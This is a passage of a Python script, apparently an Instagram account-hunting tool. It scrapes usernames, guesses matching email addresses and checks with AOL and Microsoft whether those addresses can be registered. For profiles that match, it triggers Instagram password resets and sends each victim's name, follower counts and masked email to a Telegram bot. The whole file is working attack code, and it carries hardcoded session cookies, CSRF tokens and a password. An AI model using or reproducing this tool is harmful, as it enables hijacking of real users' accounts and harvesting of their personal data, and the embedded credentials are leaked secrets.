                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
                    'X-Requested-With': 'XMLHttpRequest',
                }

                data = {
                    'browser-fp-data': '{"language":"en-US","colorDepth":24,"deviceMemory":8,"pixelRatio":1,"hardwareConcurrency":2,"timezoneOffset":-180,"timezone":"Asia/Baghdad","sessionStorage":1,"localStorage":1,"indexedDb":1,"openDatabase":1,"cpuClass":"unknown","platform":"Win32","doNotTrack":"unknown","plugins":{"count":3,"hash":"e43a8bc708fc490225cde0663b28278c"},"canvas":"canvas winding:yes~canvas","webgl":1,"webglVendorAndRenderer":"Google Inc.~Google SwiftShader","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":0,"hasLiedBrowser":0,"touchSupport":{"points":0,"event":0,"start":0},"fonts":{"count":49,"hash":"411659924ff38420049ac402a30466bc"},"audio":"124.04347527516074","resolution":{"w":"1366","h":"768"},"availableResolution":{"w":"728","h":"1366"},"ts":{"serve":1628709339039,"render":1628709338648}}',
                    'specId': 'yidreg',

                    'crumb': 'H4.yvLRdejE',
                    'acrumb': '9Ach1eVW',
                    'done': 'https://api.login.aol.com/oauth2/authorize?client_id=dj0yJmk9ZXRrOURhMkt6bkl5JnM9Y29uc3VtZXJzZWNyZXQmc3Y9MCZ4PWQ2&intl=us&nonce=kYrCBuoE3NhBcpMPi7iWi4QTnplDEgs0&redirect_uri=https%3A%2F%2Foidc.www.aol.com%2Fcallback&response_type=code&scope=mail-r+openid+openid2+sdps-r&src=fp-us&state=eyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vd3d3LmFvbC5jb20vIn0.hlDqNBD0JrMZmY2k9lEi6-BfRidXnogtJt8aI-q2FdbvKg9c9EhckG0QVK5frTlhV8HY7Mato7D3ek-Nt078Z_i9Ug0gn53H3vkBoYG-J-SMqJt5MzG34rxdOa92nZlQ7nKaNrAI7K9s72YQchPBn433vFbOGBCkU_ZC_4NXa9E',

                    'attrSetIndex': '0',

                    'tos0': 'oath_freereg|us|en-US',
                    'firstName': 'dlsdl',
                    'lastName': 'alo',
                    'yid': KL,
                    'password': 'zaidkaream00AII0@',
                    'shortCountryCode': 'US',
                    'phone': '2097635173',
                    'mm': '1',
                    'dd': '5',
                    'yyyy': '2000',
                    'freeformGender': '',
                    'signup': ''
                }

                try:
                    req = requests.post(url, headers=head, data=data).text
                except requests.exceptions.ConnectionErro as error:
                    system('clear')
                    print('intrnit Error')
                    exit()

                if ('"yid"') in req:
                    os.system('cls' if os.name == 'net' else 'clear')
                    qw += 1
                    print(
                        f'\033[1;32mAvailable Gmail : {L}\nAvailable Hotmail : {hot}\n\033[1;32mAvailable Aol : {t}\n\033[1;32mAvilable Ru : {f}\n\033[1;33mBad insatgram : {a}\n\033[1;33mBad Mail : {qw}\n\033[1;35m[=] - Error User : {E}\n\033[1;36m——————————————×——————————————\n\033[1;32mTelegram = @PPGBB\nChecker mail = 『 {B} 』')
                ############################
                else:
                    t += 1
                    os.system('cls' if os.name == 'net' else 'clear')
                    print(
                        f'\033[1;32mAvailable Gmail : {L}\nAvailable Hotmail : {hot}\n\033[1;32mAvailable Aol : {t}\n\033[1;32mAvilable Ru : {f}\n\033[1;33mBad insatgram : {a}\n\033[1;33mBad Mail : {qw}\n\033[1;35m[=] - Error User : {E}\n\033[1;36m——————————————×——————————————\n\033[1;32mTelegram = @PPGBB\nChecker mail = 『 {B} 』')
                    ############################
                    iii = (KL)
                    url22 = f'https://www.instagram.com/{iii}/?__a=1&__d=dis'
                    try:
                        fi1 = open('cookies.txt', 'r').read().splitlines()
                    except FileNotFoundError as error:
                        system('clear')
                        print('File Error')
                        exit()
                    head1 = {
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                        'cookie': '{}'.format(fi1),
                        'referer': 'https://www.instagram.com/{}/'.format(iii),
                        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
                        'sec-ch-ua-mobile': '?1',
                        'sec-fetch-dest': 'document',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'snone',
                        'upgrade-insecure-requests': '1',
                        'user-agent': generate_user_agent(),

                    }
                    rr = requests.get(url22, headers=head1).json()
                    try:
                        nam = str(rr['graphql']['user']['full_name'])
                        iddd = str(rr['graphql']['user']['id'])
                        fol = str(rr['graphql']['user']['edge_followed_by']['count'])
                        fols = str(rr['graphql']['user']['edge_follow']['count'])
                        isp = str(rr['graphql']['user']['is_private'])
                        bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
                        re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iddd}")
                        ree = re.json()
                        dat = ree['date']
                        j += 1
                        headers = {
                            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                            'Host': 'i.instagram.com',
                            'Connection': 'Keep-Alive',
                            'User-Agent': 'Instagram 6.12.1 Android (25/7.1.2; 160dpi; 383x680; LENOVO/Android-x86; 4242ED1; x86_64; android_x86_64; en_US)',

                            'Accept-Language': 'en-US',
                            'X-IG-Connection-Type': 'WIFI',
                            'X-IG-Capabilities': 'AQ==',
                        }
                        data = {
                            'ig_sig_key_version': '4',
                            "user_id": iddd
                        }
                        res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',
                                            headers=headers, data=data).json()
                        rs = str(res['obfuscated_email'])
                        tlg = (f'''https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text=𝙸𝙽𝚂𝚃𝙰𝙶𝚁𝙰𝙼 𝙸𝚂 𝙰𝚅𝙰𝙸𝙻𝙰𝙱𝙻𝙴
┗━━━━━━━━⧪━━━━━━━━┛
𝙷𝙸𝚃𖤴 : {j}\n⚋⚋⚋⚋⚋⚋(@PPGBB)⚋⚋⚋⚋⚋⚋\n𝙽𝙰𝙼𝙴 : {nam}\n𝚄𝚂𝙴𝚁 𝙽𝙰𝙼𝙴 : = {iii}\n𝙶𝙼𝙰𝙸𝙻 : {iii}@gmail.com\n𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 : {fol}\n𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {fols}\n𝙿𝙾𝚂𝚃𝚂 : {bio}\n⚋⚋⚋⚋⚋⚋(@PPGBB)⚋⚋⚋⚋⚋⚋\n𝙳𝙰𝚃𝙰 𝙰𝙲𝙲𝙾𝙺𝙽𝚃 : {dat}\n𝚁𝙴𝚂𝚃 : {rs}\n⚋⚋⚋⚋⚋⚋(@PPGBB)⚋⚋⚋⚋⚋⚋\nTELE : @PPGBB - @PYTHON_PG
''')
                        ru = requests.post(tlg)
                    except KeyError as error:
                        os.system('cls' if os.name == 'net' else 'clear')
                        E += 1
                        print(
                            f'\033[1;32mAvailable Gmail : {L}\nAvailable Hotmail : {hot}\n\033[1;32mAvailable Aol : {t}\n\033[1;32mAvilable Ru : {f}\n\033[1;33mBad insatgram : {a}\n\033[1;33mBad Mail : {qw}\n\033[1;35m[=] - Error User : {E}\n\033[1;36m——————————————×——————————————\n\033[1;32mTelegram = @PPGBB\nChecker mail = 『 {B} 』')
        ############################
        if ('@hotmail.com') in B:
            KL = B.split('@')[0]

            headers = {
                'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
            uid = str(uuid4())
            data = {
                'uuid': uid,
                'password': 'ffffdddddaaa666',
                'username': B,
                'device_id': uid,
                'from_reg': 'false',
                '_csrftoken': 'missing',
                'login_attempt_countn': '0'
            }
            re = requests.post(url, headers=headers, data=data).text

            if ('"The username you entered ') in re:
                os.system('cls' if os.name == 'net' else 'clear')
                a += 1
                print(
                    f'\033[1;32mAvailable Gmail : {L}\nAvailable Hotmail : {hot}\n\033[1;32mAvailable Aol : {t}\n\033[1;32mAvilable Ru : {f}\n\033[1;33mBad insatgram : {a}\n\033[1;33mBad Mail : {qw}\n\033[1;35m[=] - Error User : {E}\n\033[1;36m——————————————×——————————————\n\033[1;32mTelegram = @PPGBB\nChecker mail = 『 {B} 』')
            ############################
            else:
                url3 = 'https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=' + B + '&_=1604288577990'
                headers = {
                    "Accept": "*/*",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
                    "Connection": "close",
                    "Host": "odc.officeapps.live.com",
                    "Accept-Encoding": "gzip, deflate",
                    "Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
                    "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
                    "canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
                    "uaid": "d06e1498e7ed4def9078bd46883f187b",
                    "Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"
                }
                data = ''
                res = requests.post(url3, headers=headers, data=data)
                if res.json()['status'] == 'USERNAME_UNAVAILABLE':
                    if 'Neither' in res:
                        os.system('cls' if os.name == 'net' else 'clear')
                        hot += 1
                        print(
                            f'\033[1;32mAvailable Gmail : {L}\nAvailable Hotmail : {hot}\n\033[1;32mAvailable Aol : {t}\n\033[1;32mAvilable Ru : {f}\n\033[1;33mBad insatgram : {a}\n\033[1;33mBad Mail : {qw}\n\033[1;35m[=] - Error User : {E}\n\033[1;36m——————————————×——————————————\n\033[1;32mTelegram = @PPGBB\nChecker mail = 『 {B} 』')
                        iii = (KL)
                    url22 = f'https://www.instagram.com/{iii}/?__a=1&__d=dis'
                    try:
                        fi1 = open('cookies.txt', 'r').read().splitlines()
                    except FileNotFoundError as error:
                        system('clear')
                        print('File Error')
                        exit()
                    head1 = {
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                        'cookie': '{}'.format(fi1),
                        'referer': 'https://www.instagram.com/{}/'.format(iii),
                        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
                        'sec-ch-ua-mobile': '?1',
                        'sec-fetch-dest': 'document',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'snone',
                        'upgrade-insecure-requests': '1',
                        'user-agent': generate_user_agent(),

                    }
                    rr = requests.get(url22, headers=head1).json()
                    try:
                        nam = str(rr['graphql']['user']['full_name'])
                        iddd = str(rr['graphql']['user']['id'])
                        fol = str(rr['graphql']['user']['edge_followed_by']['count'])
                        fols = str(rr['graphql']['user']['edge_follow']['count'])
                        isp = str(rr['graphql']['user']['is_private'])
                        bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
                        re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iddd}")
                        ree = re.json()
                        dat = ree['date']
                        j += 1
                        headers = {
                            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                            'Host': 'i.instagram.com',
                            'Connection': 'Keep-Alive',
                            'User-Agent': 'Instagram 6.12.1 Android (25/7.1.2; 160dpi; 383x680; LENOVO/Android-x86; 4242ED1; x86_64; android_x86_64; en_US)',

                            'Accept-Language': 'en-US',
                            'X-IG-Connection-Type': 'WIFI',
                            'X-IG-Capabilities': 'AQ==',
                        }
                        data = {
                            'ig_sig_key_version': '4',
                            "user_id": iddd
                        }
                        res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',
                                            headers=headers, data=data).json()
                        rs = str(res['obfuscated_email'])
                        tlg = (f'''https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text=𝙸𝙽𝚂𝚃𝙰𝙶𝚁𝙰𝙼 𝙸𝚂 𝙰𝚅𝙰𝙸𝙻𝙰𝙱𝙻𝙴
┗━━━━━━━━⧪━━━━━━━━┛
𝙷𝙸𝚃𖤴 : {j}\n⚋⚋⚋⚋⚋⚋(@PPGBB)⚋⚋⚋⚋⚋⚋\n𝙽𝙰𝙼𝙴 : {nam}\n𝚄𝚂𝙴𝚁 𝙽𝙰𝙼𝙴 : = {iii}\n𝙶𝙼𝙰𝙸𝙻 : {iii}@gmail.com\n𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 : {fol}\n𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {fols}\n𝙿𝙾𝚂𝚃𝚂 : {bio}\n⚋⚋⚋⚋⚋⚋(@PPGBB)⚋⚋⚋⚋⚋⚋\n𝙳𝙰𝚃𝙰 𝙰𝙲𝙲𝙾𝙺𝙽𝚃 : {dat}\n𝚁𝙴𝚂𝚃 : {rs}\n⚋⚋⚋⚋⚋⚋(@PPGBB)⚋⚋⚋⚋⚋⚋\nTELE : @PPGBB - @PYTHON_PG
''')
                        ru = requests.post(tlg)
                    except KeyError as error:
                        os.system('cls' if os.name == 'net' else 'clear')
                        E += 1
                        print(
                            f'\033[1;32mAvailable Gmail : {L}\nAvailable Hotmail : {hot}\n\033[1;32mAvailable Aol : {t}\n\033[1;32mAvilable Ru : {f}\n\033[1;33mBad insatgram : {a}\n\033[1;33mBad Mail : {qw}\n\033[1;35m[=] - Error User : {E}\n\033[1;36m——————————————×——————————————\n\033[1;32mTelegram = @PPGBB\nChecker mail = 『 {B} 』')


a = 0
v = 0
ok = '09751436'
bb = "zmcbvahflwpwueytvdgtlepw"


def zaid9():
    global bb, a, v, ok
    while True:
        number = random.choice(ok)

        username = str(''.join(random.choice(bb) for i in range(7))).lower()

        url = f'https://www.instagram.com/web/search/topsearch/?context=blended&query={username}&rank_token=0.38549261586414585&include_reel=true'
        head11 = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',

            'cookie': 'ig_nrcb=1; mid=Yn0mhAABAAF67zpxcopyc_DiDqlW; ig_did=66C4F652-81B2-40FB-AD7E-98260457287F; fbm_124024574287414=base_domain=.instagram.com; csrftoken=B5EvgsGegpjkHbwakmeZzZeibMUyPXOo; ds_user_id=479320179; sessionid=479320179:YJP7Mp7LRlvDVe:17; shbid="6887\054479320179\0541685041134:01f78226f1ed25a1fd638da513ee9fc0bd85ad7b75335c66e00546dddc526839ed8673b3"; shbts="1653505134\054479320179\0541685041134:01f7359bb436c3c2a6a593d450045a6d47feeeb49309f4e3e34f16846a86521cd654f96c"; fbsr_124024574287414=-t_KkO2zVCJ8dtHJUTSp1hNWF4FvrBOMic2GrdYXfXo.eyJ1c2VyX2lkIjoiMTAwMDY0NTIzMTU1MTczIiwiY29kZSI6IkFRQmtRTDJLM0F6eC1NYUE5blBMQ3lrYXBONFVQYUU4RDJ3cG1GcmlJTjFqN0x4aVU1UWdtekFGcDEwaEtHZ2Y3RUdhY3VFNFBFMDdwN0VNWUtnTFVyT0lPbGNLN3BBWEExVDBCbjRtTnI2bVFSbFpBY0tuOWp4ZS1HNGd3QVk2bUZwdmZoeXVHeXV5U09ZcWtIVW83VWM3V1ZFUTdERG4wQU16dDN6WmVxckxYOGhVMXE2WnRqbEhvMlQwdVRHQzZ0SXpWak4wT3otNjUyU2pkQVRLbmZBcmM1MkEzeVQ2c0JmbGZUX2M3alQ4TWZuZU02b3NQcmZuTF9CVnptbWp4eVBYbm85alRDRUMyRzNGLWgyNE5Ua0Y4NkVZbDRFR1Q0NExqQkl3NnZfekdHYW5MckF3Q3dMVUJMMF81Mzd3bDlnIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUJ5SmR4WTE5T0t5M1pDQlpBTkJqaWc5d0M0bTlqSVdUZHdWVTdJa01PTjBXVkZ2ZXVpSE4waHZTamF4cXpaQTJxWkJzVXR6cXBMWkNwYzJNYzVJS0lUVW5DMHJNWWZuVDRVRVFhYWhaQ2JKZm03bEQ1Q1hNdE14bGVyV2FFRGZrT2U2Y0RSSmg2OWFtZlV4eGFVRmFHMGlkRHR3VnJZNXo1VzVMZ0U5Q2UiLCJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImlzc3VlZF9hdCI6MTY1MzUwNjE1NH0; rur="ASH\054479320179\0541685042266:01f7314545b2fc6431250d9f16c78ee257c43ef7fffb40f551f9109cef47d42ed774d508"',

            'referer': 'https://www.instagram.com/explore/search/',
            'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
            'sec-ch-ua-mobile': '?0',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
            'x-asbd-id': '437806',
            'x-csrftoken': 'B5EvgsGegpjkHbwakmeZzZeibMUyPXOo',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',
            'x-requested-with': 'XMLHttpRequest'
        }

        data2 = {
            'context': 'blended',
            'query': '{}'.format(username),
            'rank_token': '0.38549261586414585',
            'include_reel': 'true'

        }
        y = requests.get(url, headers=head11).json()
        try:
            iddd = len(str(y['users'][0]['user']['pk']))

        except IndexError as error:
            v += 1
            continue
        for ll in range(0, iddd):
            try:
                nn = str(y['users'][ll]['user']['username'])
                a += 1
                os.system('cls' if os.name == "net" else 'clear')
                print(
                    f"\033[1;32m[𖤥] - Done : {a}\n[𖤥] - Error : {v}\n[𖤥] - Username : {nn}\n\033[1;33m[𖤥] - Telegram : @PPGBB")
                with open('gmail.txt', 'a') as f3:
                    Fq = ['@gmail.com', '@mail.ru', '@aol.com', 'hotmail.com']
                    Hq = random.choice(Fq)
                    f3.write(f'{nn}{Hq}\n')
            except IndexError as error:
                continue


def Cl():
    global a, z, t

    iii = input('\033[1;33m▶️ Enter Your User list - \033[1;32mاضف يوزر لسحب لستة : \n')

    global cookies

    url22 = f'https://www.instagram.com/{iii}/?__a=1&__d=dis'
    head1 = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'cookie': f'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid={cookies}',
        'referer': 'https://www.instagram.com/{}/'.format(iii),
        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
        'sec-ch-ua-mobile': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': generate_user_agent(),
        'x-asbd-id': '437806',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': 'hmac.AR3iJo8fToOaW2YqFg8Fs_vZX0vRsp_WJuOh9w4JPDrYKWOV',
        'x-requested-with': 'XMLHttpRequest'
    }

    try:
        rr = requests.get(url22, headers=head1).json()

    except json.decoder.JSONDecodeError as error:
        system('clear')
        print('* \033[1;32mالحساب مبند')
        exit()

    try:
        fol = str(rr['graphql']['user']['edge_follow']['count'])
        idd = str(rr['logging_page_id'])
        ss = idd.split('_')[1]
    except KeyError as error:
        print('اليوزر غير صحيح')
        time.sleep(1)
        system('clear')
        while True:
            Cl()
        # exit()

    x = int(fol)

    def cv(iii, ss, fol, x):
        global t, a, ci, cookies
        ci += 80
        t += 1
        url4 = f'https://i.instagram.com/api/v1/friendships/{ss}/following/?max_id={ci}'
        head4 = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'cookie': f'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid={cookies}',
            'referer': 'https://www.instagram.com/',
            'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
            'sec-ch-ua-mobile': '?0',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': generate_user_agent(),
            'x-asbd-id': '437806',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR3iJo8fToOaW2YqFg8Fs_vZX0vRsp_WJuOh9w4JPDrYKWOV',
            'x-requested-with': 'XMLHttpRequest'
        }

        re = requests.get(url4, headers=head4).json()
        zaid = 0
        try:
            while True:
                for zaid1 in re:
                    zaid += 1
                    us = str(re['users'][zaid]['username'])
                    a += 1
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(
                        f'\033[1;35m[𖤥] - Done >> [{a}]\n[𖤥] - Error : {t}\n[𖤥] - User >> \033[1;36m[{us}]\n\033[1;32m[𖤥] - Telegram : @PPGBB')
                    with open('gmail.txt', 'a') as f6:
                        Fq = ['@gmail.com', '@mail.ru', '@aol.com', 'hotmail.com']
                        Hq = random.choice(Fq)
                        f6.write(f'{us}{Hq}\n')
                    if zaid == x:
                        print('Done')
                        exit()
        except IndexError as error:
            cv(iii, ss, fol, x)

    cv(iii, ss, fol, x)


def followers():
    print(Z1 + '━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    os.system('rm -rf user.txt')
    L = instaloader.Instaloader()
    username = input(" اكتب يوزر الحساب الوهمي : ")
    print(Z1 + '━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    password = input(" اكتب باسورد الحساب الوهمي : ")
    print(Z1 + '━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    getuser = input(" يوزر حساب سحب السته منه : ")
    print(Z1 + '━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print("انتضر سيتم سحب اليوزرات")
    print(Z1 + '━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    os.system('rm -rf gmail.txt')
    L.login(username, password)
    profile = instaloader.Profile.from_username(L.context, getuser)
    follow_list = []
    count = 0
    ok = 0
    for followee in profile.get_followers():
        name1 = str(followee)
        name2 = name1.split('Profile ')[1]
        name3 = name2.split(' (')[0]
        Fq = ['@gmail.com', '@mail.ru', '@aol.com', 'hotmail.com']
        Hq = random.choice(Fq)
        follow_list.append(name3 + Hq)
        file = open("gmail.txt", "a")
        file.write(follow_list[count])
        file.write("\n")
        file.close()
        ok += 1
        t = 0
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f'\033[1;35m[𖤥] - Done >> [{ok}]\n[𖤥] - Error : {t}\n[𖤥] - User >> \033[1;36m' + str(name3))
        count = count + 1


def following():
    print(Z1 + '━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    os.system('rm -rf gmail.txt')
    L = instaloader.Instaloader()
    username = input(" اكتب يوزر الحساب الوهمي : ")
    print(Z1 + '━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    password = input(" اكتب باسورد الحساب الوهمي : ")
    print(Z1 + '━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    getuser = input(" يوزر حساب سحب السته منه : ")
    print(Z1 + '━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print("انتضر سيتم سحب اليوزرات")
    print(Z1 + '━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    os.system('rm -rf gmail.txt')
    L.login(username, password)
    profile = instaloader.Profile.from_username(L.context, getuser)
    follow_list = []
    count = 0
    ok = 0
    for followee in profile.get_followees():
        name1 = str(followee)
        name2 = name1.split('Profile ')[1]
        name3 = name2.split(' (')[0]
        Fq = ['@gmail.com', '@mail.ru', '@aol.com', 'hotmail.com']
        Hq = random.choice(Fq)
        follow_list.append(name3 + Hq)
        file = open("gmail.txt", "a")
        file.write(follow_list[count])
        file.write("\n")
        file.close()
        ok += 1
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f'\033[1;35m[𖤥] - Done >> [{ok}]\n[𖤥] - Error : {t}\n[𖤥] - User >> \033[1;36m' + str(name3))
        count = count + 1


def sison():
    USER = input(Fore.GREEN + 'حط اسم المستخدم :')
    PASS = input(Fore.GREEN + 'حط كلمه المرور :')
    url = 'https://www.instagram.com/accounts/login/ajax/'
    headers = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "content-length": "385",
        "content-type": "application/x-www-form-urlencoded",
        "cookie": "csrftoken=Lk9Lfwj0Hp0T3zCBYwjoeGBUBjU1sVXC; mid=YSuaiwAEAAEzvEB8maY7IzJ6MDzJ; ig_did=07753880-8B96-4C09-93E9-BA39B801DD08",
        "origin": "https://www.instagram.com",
        "referer": "https://www.instagram.com/accounts/login/",
        "sec-ch-ua": '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
        "sec-ch-ua-mobile": "?0",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
        "x-asbd-id": "437806",
        "x-csrftoken": "Lk9Lfwj0Hp0T3zCBYwjoeGBUBjU1sVXC",
        "x-ig-app-id": "936619743392459",
        "x-ig-www-claim": "0",
        "x-instagram-ajax": "56f3c2d2a823",
        "x-requested-with": "XMLHttpRequest"
    }
    data = {
        "username": f"{USER}",
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:1613414957:{PASS}",
        "queryParams": "{}",
        "optIntoOneTap": "false"
    }

    req_login = requests.post(url, headers=headers, data=data)
    if '"authenticated":false' in req_login.text:
        print(Fore.RED + 'خطا في اليوزر او الباسورد')
        exit(0)
    elif '"authenticated":true' in req_login.text:
        print(Fore.GREEN + '[+] Done Login')
    sess = req_login.cookies['sessionid']
    time.sleep(1)
    with open('sessionid.txt', 'a') as s:
        s.write(f"{sess}\n")
        print(f'\n\n{sess}\n\n')
        print(Fore.MAGENTA + 'تم حفظ السيزن ايدي في ملف sessionid.txt [+]')


def O():
    try:
        os.remove('gmail.txt')
        print('Done - تم حذف الملف بنجاح')
    except FileNotFoundError as error:
        system('clear')
        print('Error - ملف gmail.txt غير متوفر في جهازك')


print(
    '\033[1;32m		قسم صيد متاحات انستا\n\033[1;32m[1] - List Username - انشاء لستة عشوائية\n[2] - List username - انشاء لستة من يوزر\n[3] - Cheker List - فحص لستة\n[4] - list From Following - لستة من المتابعهم\n[5] - list From Followers - لستة من المتابعين\n[6] - list From Post like account - لستة من بوست لايكات\n[7] - list From search - لستة من بحث\n[8] - SESION Insta -  استخراج سيزن\n[0] - Remove List - حذف لستة')
# \n[0] - Remove List - حذف لستة
try:
    H = int(input('\033[1;35m[!] - Enter Your - ارسل رقم : '))
    system("clear")
except ValueError as error:
    system('clear')
    print('Error - لا يجوز اختيار احرف')
    exit()
if H == 1:
    zaid9()
    exit()
elif H == 2:
    Cl()
    exit()
elif H == 3:

    Gmail()
    exit()
elif H == 4:
    following()
    exit()
elif H == 5:
    followers()
    exit()
if H == 6:
    usernames = input("\033[1;32m⌯\033[1;39m Enter usernames:")
    password = input("\033[1;32m⌯\033[1;39m Enter password:")
    print("-" * 20)
    checker(usernames, password).likes()
    exit()
elif H == 7:
    usernames = input("\033[1;32m⌯\033[1;39m Enter usernames:")
    password = input("\033[1;32m⌯\033[1;39m Enter password:")
    print("-" * 20)
    checker(usernames, password).search()
    exit()
elif H == 8:
    sison()
    exit()

elif H == 0:
    O()
    exit()
else:
    system('clear')
    print('Error - اختيار خطأ')
    exit()